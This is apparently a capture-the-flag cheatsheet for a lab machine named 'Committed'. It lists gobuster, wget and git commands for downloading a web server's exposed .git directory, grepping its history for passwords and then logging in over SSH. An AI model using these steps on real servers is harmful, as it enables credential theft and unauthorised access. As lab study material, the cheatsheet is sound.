# Cheatsheet — Committed

## Targets

- **web01** — apache + php; the whole project directory was shipped to the web root

## Useful commands

```bash
gobuster dir -u http://<ip>/ -w /usr/share/wordlists/dirb/common.txt
wget -r -np -nH http://<ip>/.git/          # recursive repo download
# then, inside the download:
git status                               # files look 'deleted' — restore:
git checkout -- .
git log --oneline; git show <commit>     # history keeps secrets
git log -p | grep -in pass               # grep the whole history
# or skip wget entirely: GitTools/git-dumper or DotGit-style extension
ssh <user>@<ip>
```

## Concepts

- Server-side code (PHP) isn't served — but the repo that produced it is
  just a pile of files
- `git rm` doesn't erase history; only filter-repo/BFG does
- Directory listing (autoindex) turns "the dir exists" into "the dir is
  downloadable" — without it you'd need git-dumper's known-path trick
